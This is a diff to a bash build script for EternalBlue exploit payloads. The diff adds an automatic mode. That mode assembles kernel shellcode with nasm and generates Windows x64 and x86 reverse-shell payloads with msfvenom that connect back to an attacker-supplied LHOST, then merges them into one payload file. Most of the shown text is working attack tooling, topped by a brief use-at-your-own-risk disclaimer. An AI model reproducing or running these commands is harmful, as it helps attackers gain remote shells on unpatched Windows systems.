@@ -1,4 +1,23 @@
 #!/bin/bash
+echo ""
+echo "Cleaning old builds..."
+/bin/bash ./clean.sh
+echo ""
+
+auto=0
+if ! [ -z "$1" ]; then
+	# Argument supplied
+	if [ "$1" == "auto" ]; then
+		echo "Running in automatic mode."
+		echo "Defaults will be used."
+		auto=1
+		if [ -z "$2" ]; then
+			echo "No LHOST given. Aborting!"
+			exit 3
+		fi
+	fi
+fi
+
 DEFLPORTX86=444
 DEFLPORTX64=443
 
@@ -37,14 +56,27 @@ echo ""
 echo "If you use this software, you'll do it at your own risk and responibility."
 echo "##########################################################################"
 tput sgr0
+
+if [[ $auto -eq 1 ]]; then
+	# automatic mode
+	sleep 5
+	echo Compiling x64 kernel shellcode
+	nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
+	nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin
+	# Defaulting Payload to a basic reverse-shell
+	msfvenom -a x64 -p windows/x64/shell_reverse_tcp --platform windows -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$2 LPORT=$DEFLPORTX64
+	msfvenom -a x86 -p windows/shell_reverse_tcp --platform windows -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$2 LPORT=$DEFLPORTX86
+	cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
+	cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
+	python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
+	exit 0
+fi
+
+# Manual mode
 echo "Do you wish to continue? (Y/n)"
-read genMSF
-if [[ $genMSF =~ [yY](es)* ]]; then
+read conti
+if [[ $conti =~ [yY](es)* ]]; then
 	echo ""
-	echo ""
-	echo ""
-	echo "Cleaning old builds..."
-	/bin/bash ./clean.sh
 	echo ""
 	echo Compiling x64 kernel shellcode
 	echo "Invoking: nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin"
